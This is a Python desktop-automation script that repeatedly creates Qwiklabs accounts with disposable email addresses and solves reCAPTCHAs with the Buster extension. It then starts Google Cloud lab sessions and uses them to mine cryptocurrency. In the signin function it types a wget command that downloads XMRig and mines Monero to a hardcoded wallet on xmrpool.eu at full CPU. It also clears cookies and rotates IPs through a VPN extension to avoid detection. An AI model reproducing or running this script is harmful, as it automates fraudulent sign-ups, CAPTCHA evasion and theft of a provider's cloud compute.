#import os
#os.system('cmd /c "cd Desktop && cd chrome signup && qwiklabs.com - Chrome.lnk"')
import pyautogui
from time import sleep
import webbrowser
from pynput.mouse import Button, Controller
mouse = Controller()
from pynput.keyboard import Key, Controller
keyboard = Controller()
import pyperclip
import pyautogui
from time import sleep
import random
import string
sleep(5)
def install_chrome():
	##open edge browser
	mouse.position = (170, 742)
	mouse.click(Button.left, 1)
	sleep(5)
	##click on search bar
	mouse.position = (290, 72)
	mouse.click(Button.left, 1)
	sleep(0.5)
	##remove text
	keyboard.press(Key.ctrl)
	keyboard.press('a')
	keyboard.release('a')
	keyboard.release(Key.ctrl)
	keyboard.press(Key.backspace)
	keyboard.release(Key.backspace)
	sleep(0.2)
	##go to chrome site
	keyboard.type('https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7B0FBDF0EC-4DF6-4765-5C09-45598F7F4281%7D%26lang%3Den%26browser%3D2%26usagestats%3D1%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26brand%3DRXQR%26installdataindex%3Dempty/update2/installers/ChromeSetup.exe')
	keyboard.press(Key.enter)
	keyboard.release(Key.enter)
	sleep(4)
	##naximize
	pyautogui.keyDown("alt")
	pyautogui.keyDown("space")
	pyautogui.press('x')
	pyautogui.keyUp("alt")
	pyautogui.keyUp("space")
	sleep(2)
	##run installer
	mouse.position = (960, 705)
	mouse.click(Button.left, 1)
	sleep(1)
	##close eadge
	mouse.position = (1347, 7)
	mouse.click(Button.left, 1)
	##sleep 
	sleep(25)
	##maximize
	pyautogui.keyDown("alt")
	pyautogui.keyDown("space")
	pyautogui.press('x')
	pyautogui.keyUp("alt")
	pyautogui.keyUp("space")
	mouse.position = (1085, 242)
	mouse.click(Button.left, 1)
	##select search bar
	keyboard.press(Key.ctrl)
	keyboard.press('l')
	keyboard.release('l')
	keyboard.release(Key.ctrl)
	sleep(0.5)
def download_extention():
	##go to site buster varifier
	keyboard.type('https://chrome.google.com/webstore/detail/buster-captcha-solver-for/mpbjkejclgfgadiemmefgebjfooflfhl?hl=en')
	keyboard.press(Key.enter)
	keyboard.release(Key.enter)
	sleep(7)
	##add to chrome
	mouse.position = (1085, 242)
	mouse.click(Button.left, 1)
	sleep(1)
	mouse.position = (722, 273)
	mouse.click(Button.left, 1)
	mouse.click(Button.left, 1)
	sleep(5)
	##New page
	keyboard.press(Key.ctrl)
	keyboard.press('t')
	keyboard.release('t')
	keyboard.release(Key.ctrl)
	sleep(0.5)
	##go to first page and close it
	keyboard.press(Key.ctrl)
	keyboard.press('1')
	keyboard.release('1')
	keyboard.release(Key.ctrl)
	sleep(0.5)
	keyboard.press(Key.ctrl)
	keyboard.press('w')
	keyboard.release('w')
	keyboard.release(Key.ctrl)
	sleep(0.75)
	##select search bar
	keyboard.press(Key.ctrl)
	keyboard.press('l')
	keyboard.release('l')
	keyboard.release(Key.ctrl)
	sleep(0.5)
def signup():
		## select search bar
		x = 471
		y = 56
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		## go to site
		pyautogui.typewrite("https://www.qwiklabs.com/users/sign_up", interval = 0.02)
		pyautogui.press('enter')
		#sleep(3)
		## click creat account
		#x = 1192
		#y = 105
		#pyautogui.moveTo( x , y , duration = 0.1)
		#pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		# open email generator
		##new tab
		#x = 272
		#y = 12
		#pyautogui.moveTo( x , y , duration = 0.1)
		#sleep(0.5)
		#pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		pyautogui.keyDown("ctrl")
		pyautogui.press('t')
		pyautogui.keyUp("ctrl")
		# select search bar
		x = 160
		y = 50
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		# go to site
		pyautogui.typewrite("https://generator.email/", interval = 0.02)
		pyautogui.press('enter')
		sleep(2)
		##generate new email
		x = 608
		y = 564
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		x = 608
		y = 631
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		x = 613
		y = 595
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		x = 985
		y = 543
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 2 , interval = 0.1)
		sleep(2)
		# copy emaile
		x = 985
		y = 543
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 2 , interval = 0.1)
		c = pyperclip.paste()
		# back to previos tab
		x = 62
		y = 17
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		# fill form
		## name and lastname
		#x = 558
		#y = 393
		#pyautogui.moveTo( x , y , duration = 0.1)
		#sleep(0.5)
		#pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		pyautogui.press('tab')
		pyautogui.typewrite("alex", interval = 0.02)
		#x = 796
		#y = 399
		#pyautogui.moveTo( x , y , duration = 0.1)
		#sleep(0.5)
		#pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		pyautogui.press('tab')
		pyautogui.typewrite("boboltala", interval = 0.02)
		## paste email
		#x = 647
		#y = 473
		#pyautogui.moveTo( x , y , duration = 0.1)
		#sleep(0.5)
		#pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		pyautogui.typewrite(c, interval = 0.02)
		## select company
		#x = 695
		#y = 524
		#pyautogui.moveTo( x , y , duration = 0.1)
		#sleep(0.5)
		#pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		pyautogui.press('tab')
		pyautogui.typewrite("boboltala", interval = 0.02)
		##write pass
		#x = 538
		#y = 592
		#pyautogui.moveTo( x , y , duration = 0.1)
		#sleep(0.5)
		#pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		pyautogui.press('tab')
		pyautogui.typewrite("boboltala1$$", interval = 0.02)
		#x = 777
		#y = 600
		#pyautogui.moveTo( x , y , duration = 0.1)
		#sleep(0.5)
		#pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		pyautogui.press('tab')
		pyautogui.typewrite("boboltala1$$", interval = 0.02)
		# scroll down
		x = 1360
		y = 720
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 10 , interval = 0.1)
		# select recaptcha
		x = 428
		y = 378
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		sleep(2)
		#select buster
		x = 578
		y = 664
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		sleep(5)
		x = 486
		y = 542
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		sleep(2)
		x = 578
		y = 542
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		sleep(7)
		x = 486
		y = 542
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		sleep(2)
		x = 578
		y = 542
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		sleep(7)
		x = 486
		y = 542
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		sleep(2)
		x = 578
		y = 542
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		sleep(7)
		# select recaptcha
		x = 428
		y = 378
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		sleep(2)
		##select retry
		x = 584
		y = 516
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		sleep(2)
		# select recaptcha
		x = 428
		y = 378
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		sleep(2)
		##select Buster
		x = 578
		y = 664
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		sleep(5)
		# click on creat account
		x = 865
		y = 567
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		pyautogui.press('enter')
		# email tab 
		x = 272
		y = 12
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		## go to gmail
		x = 335
		y = 18
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		sleep(6)    
		## click on refresh
		pyautogui.keyDown("ctrl")
		pyautogui.press('r')
		pyautogui.keyUp("ctrl")
		sleep(2)
		x = 745
		y = 557
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		x = 774
		y = 630
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		sleep(1)
		    
		## scroll down 12 times
		x = 1357
		y = 720
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 12 , interval = 0.03)
		    
		    
		## close advertise

		x = 837
		y = 262
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		#x = 621
		#y = 431
		#pyautogui.moveTo( x , y , duration = 0.1)
		#sleep(0.5)
		#pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		sleep(1)
		## scroll down 42 times
		x = 1357
		y = 720
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 42 , interval = 0.03)

		## select confirmation
		x = 501
		y = 220
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.03)
		sleep(3)
		#select pass
		mouse.position = (696, 391)
		mouse.click(Button.left, 1)
		mouse.click(Button.left, 1)
		pyautogui.typewrite("boboltala1$$", interval = 0.02)
		# sign in
		mouse.position = (832, 538)
		mouse.click(Button.left, 1)
		sleep(2)
		##close tab1 and tab2
		pyautogui.keyDown("ctrl")
		pyautogui.press('1')
		pyautogui.keyUp("ctrl")
		sleep(0.2)
		pyautogui.keyDown("ctrl")
		pyautogui.press('w')
		pyautogui.keyUp("ctrl")
		sleep(0.2)
		pyautogui.keyDown("ctrl")
		pyautogui.press('w')
		pyautogui.keyUp("ctrl")
		##back
		mouse.position = (23, 47)
		mouse.click(Button.left, 1)
		sleep(2)
		pyautogui.keyDown("ctrl")
		pyautogui.press('r')
		pyautogui.keyUp("ctrl")
def signin():
#####################################click on search bar
		mouse.position = (549, 100)
		mouse.click(Button.left, 1)
		mouse.click(Button.left, 1)
		sleep(0.5)
		keyboard.type('A Tour of Qwiklabs and Google Cloud')
		keyboard.press(Key.enter)
		keyboard.release(Key.enter)
		sleep(5)
		##click on cloud google
		mouse.position = (443, 283)
		mouse.click(Button.left, 1)
		mouse.click(Button.left, 1)
		sleep(3)
		##skip video
		mouse.position = (899, 635)
		mouse.click(Button.left, 1)
		mouse.click(Button.left, 1)
		sleep(3)
		##select start
		mouse.position = (55, 177)
		mouse.click(Button.left, 1)
		mouse.click(Button.left, 1)
		sleep(3)
		##select recaptcha
		mouse.position = (56, 240)
		mouse.click(Button.left, 1)
		sleep(3)
		##select solver
		##select recaptcha
		mouse.position = (166, 632)
		mouse.click(Button.left, 1)
		sleep(7)
		##refresh captcha
		##select recaptcha
		mouse.position = (69, 347)
		mouse.click(Button.left, 1)
		sleep(0.5)
		mouse.position = (69, 361)
		mouse.click(Button.left, 1)
		sleep(0.5)
		sleep(2)
		mouse.position = (56, 240)
		mouse.click(Button.left, 1)
		sleep(1)
		##click solver
		##select recaptcha
		mouse.position = (161, 350)
		mouse.click(Button.left, 1)
		sleep(0.5)
		mouse.position = (161, 362)
		mouse.click(Button.left, 1)
		sleep(0.5)
		sleep(7)
		mouse.position = (56, 240)
		mouse.click(Button.left, 1)
		sleep(1)
		##refresh captcha
		##select recaptcha
		mouse.position = (69, 347)
		mouse.click(Button.left, 1)
		sleep(0.5)
		mouse.position = (69, 361)
		mouse.click(Button.left, 1)
		sleep(0.5)
		sleep(2)
		mouse.position = (56, 240)
		mouse.click(Button.left, 1)
		sleep(1)
		##click solver
		##select recaptcha
		mouse.position = (161, 350)
		mouse.click(Button.left, 1)
		sleep(0.5)
		mouse.position = (161, 362)
		mouse.click(Button.left, 1)
		sleep(0.5)
		sleep(7)
		mouse.position = (56, 240)
		mouse.click(Button.left, 1)
		sleep(2)
		##select console
		mouse.position = (170, 321)
		mouse.click(Button.left, 1)
		sleep(2)
		##back to pre page
		keyboard.press(Key.ctrl)
		keyboard.press('1')
		keyboard.release('1')
		keyboard.release(Key.ctrl)
		sleep(0.5)
		##copy user:
		mouse.position = (248, 393)
		mouse.click(Button.left, 2)
		c = pyperclip.paste()
		sleep(1)
		##back to console
		keyboard.press(Key.ctrl)
		keyboard.press('2')
		keyboard.release('2')
		keyboard.release(Key.ctrl)
		sleep(0.5)
		##paste user:
		sleep(0.5)
		mouse.position = (582, 363)
		mouse.click(Button.left, 1)
		keyboard.press(Key.ctrl)
		keyboard.press('a')
		keyboard.release('a')
		keyboard.release(Key.ctrl)
		keyboard.press(Key.backspace)
		keyboard.release(Key.backspace)
		keyboard.type(c)
		keyboard.press(Key.enter)
		keyboard.release(Key.enter)
		##back to pre page
		keyboard.press(Key.ctrl)
		keyboard.press('1')
		keyboard.release('1')
		keyboard.release(Key.ctrl)
		sleep(1)
		##copy pass:
		mouse.position = (251, 475)
		mouse.click(Button.left, 2)
		c = pyperclip.paste()
		##back to console
		keyboard.press(Key.ctrl)
		keyboard.press('2')
		keyboard.release('2')
		keyboard.release(Key.ctrl)
		sleep(0.5)
		##paste pass:
		sleep(0.5)
		mouse.position = (582, 363)
		mouse.click(Button.left, 1)
		keyboard.press(Key.ctrl)
		keyboard.press('a')
		keyboard.release('a')
		keyboard.release(Key.ctrl)
		keyboard.press(Key.backspace)
		keyboard.release(Key.backspace)
		keyboard.type(c)
		keyboard.press(Key.enter)
		keyboard.release(Key.enter)
		sleep(3)
		##click accept
		mouse.position = (678, 575)
		mouse.click(Button.left, 1)
		mouse.position = (574, 603)
		mouse.click(Button.left, 1)
		sleep(3)
		##click confirm
		mouse.position = (824, 643)
		mouse.click(Button.left, 1)
		##save pass
		mouse.position = (1140, 370)
		mouse.click(Button.left, 1)
		sleep(1.5)
		##back to google console
		keyboard.press(Key.ctrl)
		keyboard.press('2')
		keyboard.release('2')
		keyboard.release(Key.ctrl)
		sleep(10)
		##choose country:
		mouse.position = (83, 642)
		mouse.click(Button.left, 1)
		sleep(0.5)
		keyboard.type('u')
		keyboard.press(Key.enter)
		keyboard.release(Key.enter)
		sleep(2)
		##checkbox
		mouse.position = (434, 488)
		mouse.click(Button.left, 1)
		sleep(1)
		mouse.position = (432, 433)
		mouse.click(Button.left, 1)
		sleep(1)
		mouse.position = (436, 536)
		mouse.click(Button.left, 1)
		sleep(1)
		#click agree
		mouse.position = (860, 651)
		mouse.click(Button.left, 1)
		sleep(1)
		mouse.position = (852, 602)
		mouse.click(Button.left, 1)
		sleep(5)
		mouse.position = (852, 602)
		mouse.click(Button.left, 1)
		##save pass
		#mouse.position = (1140, 370)
		#mouse.click(Button.left, 1)
		#sleep(2)
		##click Terminal
		mouse.position = (1165, 89)
		mouse.click(Button.left, 1)
		sleep(10)
		##click continue
		mouse.position = (510, 682)
		mouse.click(Button.left, 2)
		sleep(0.5)
		mouse.position = (442, 677)
		mouse.click(Button.left, 2)
		sleep(14)
		##select on shell
		mouse.position = (516, 651)
		mouse.click(Button.left, 1)
		##type command
		keyboard.type('docker run -p 6080:80 dorowu/ubuntu-desktop-lxde-vnc')
		keyboard.press(Key.enter)
		keyboard.release(Key.enter)
		##back to google console
		keyboard.press(Key.ctrl)
		keyboard.press('2')
		keyboard.release('2')
		keyboard.release(Key.ctrl)
		sleep(1)
		##sleep
		sleep(45)
		##change port
		mouse.position = (1150, 469)
		mouse.click(Button.left, 1)
		sleep(1)
		mouse.position = (1077, 552)
		mouse.click(Button.left, 1)
		sleep(1)
		mouse.position = (490, 578)
		mouse.click(Button.left, 1)
		sleep(1)
		keyboard.type("6080")
		sleep(1)
		mouse.position = (504, 670)
		mouse.click(Button.left, 1)
		sleep(15)
		##select terminal
		mouse.position = (10, 712)
		mouse.click(Button.left, 1)
		sleep(1.5)
		mouse.position = (98, 560)
		mouse.click(Button.left, 1)
		sleep(1.5)
		mouse.position = (219, 585)
		mouse.click(Button.left, 1)
		sleep(1.5)
		##select on terminal
		mouse.position = (570, 408)
		mouse.click(Button.left, 1)
		sleep(1)
		##write command
		keyboard.type("wget https://github.com/xmrig/xmrig/releases/download/v6.3.5/xmrig-6.3.5-linux-x64.tar.gz && tar xf xmrig-6.3.5-linux-x64.tar.gz && cd xmrig-6.3.5 && ./xmrig --donate-level 0.1 --max-cpu-usage 100 -o xmrpool.eu:5555 -u 46SCYJfsfSEj1EEHmwCKgCg9mgqg8xbx9BdczDJ9uqUpJRwvnSrHb517vWoE7x3Nv3iJEKbtip9T74QvZB8TJXJ86iXiGkr -p x")
		sleep(0.5)
		keyboard.press(Key.enter)
		keyboard.release(Key.enter)
		sleep(1.5)
		##back to first page
		mouse.position = (4, 12)
		mouse.click(Button.left, 1)
		sleep(1)
		##select stop
		mouse.position = (55, 177)
		mouse.click(Button.left, 1)
		sleep(2)
		keyboard.press(Key.enter)
		keyboard.release(Key.enter)
		sleep(4)
		##cancel
		mouse.position = (802, 459)
		mouse.click(Button.left, 1)
		sleep(2)
		##go to setting
		keyboard.press(Key.ctrl)
		keyboard.press('t')
		keyboard.release('t')
		keyboard.release(Key.ctrl)
		sleep(0.5)
		keyboard.press(Key.ctrl)
		keyboard.press('l')
		keyboard.release('l')
		keyboard.release(Key.ctrl)
		sleep(0.5)
		keyboard.type("https://mail.google.com/mail/?logout&hl=en")
		keyboard.press(Key.enter)
		keyboard.release(Key.enter)
		sleep(3)
		##remove pre account
		sleep(1.5)
		mouse.position = (586, 428)
		sleep(0.5)
		mouse.click(Button.left, 1)
		sleep(0.5)
		mouse.position = (856, 351)
		mouse.click(Button.left, 1)
		sleep(1)
		mouse.position = (775, 482)
		mouse.click(Button.left, 1)
		sleep(0.5)
		##close tab
		keyboard.press(Key.ctrl)
		keyboard.press('w')
		keyboard.release('w')
		keyboard.release(Key.ctrl)
		sleep(0.5)
		##back to first page
		mouse.position = (4, 14)
		mouse.click(Button.left, 1)
		sleep(0.5)
		keyboard.press(Key.ctrl)
		keyboard.press('1')
		keyboard.release('1')
		keyboard.release(Key.ctrl)
		sleep(0.5)
		keyboard.press(Key.ctrl)
		keyboard.press('r')
		keyboard.release('r')
		keyboard.release(Key.ctrl)
		sleep(3)
def panj():
		##clear cookies
		pyautogui.keyDown("ctrl")
		pyautogui.keyDown("shift")
		pyautogui.press('del')
		pyautogui.keyUp("ctrl")
		pyautogui.keyUp("shift")
		sleep(2)
		##click on delet
		mouse.position = (873, 602)
		mouse.click(Button.left, 1)
		sleep(2)
		##go to new window on windows
		keyboard.press(Key.cmd)
		keyboard.press(Key.ctrl)
		keyboard.press('d')
		keyboard.release(Key.cmd)
		keyboard.release(Key.ctrl)
		keyboard.release('d')
		sleep(4)
		## open chrome
		#webbrowser.get("C:\Program Files\Google\Chrome\Application\chrome.exe").open_new('https://www.qwiklabs.com/users/sign_up')
		#sleep(2)
		x = 64
		y = 743
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		sleep(5)
		pyautogui.typewrite("chrome", interval = 0.02)
		sleep(4)
		x = 379
		y = 212
		pyautogui.moveTo( x , y , duration = 0.1)
		sleep(0.5)
		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
		sleep(3)
		pyautogui.keyDown("alt")
		pyautogui.keyDown("space")
		pyautogui.press('x')
		pyautogui.keyUp("alt")
		pyautogui.keyUp("space")
def ChangeIp():
		##select extention
		mouse.position = (1279, 50)
		mouse.click(Button.left, 1)
		sleep(1)
		##select browsec
		mouse.position = (1070, 196)
		mouse.click(Button.left, 1)
		sleep(2.5)
		##stop
		mouse.position = (1225, 463)
		mouse.click(Button.left, 1)
		##start
		mouse.position = (1225, 463)
		mouse.click(Button.left, 1)

install_chrome()
download_extention()
i = 1
while True:
	if i == 1:
		signup()
		sleep(3)
	signin()
	sleep(3)
	if i % 5 == 0:
		panj()
		i = 0
	i = i+1
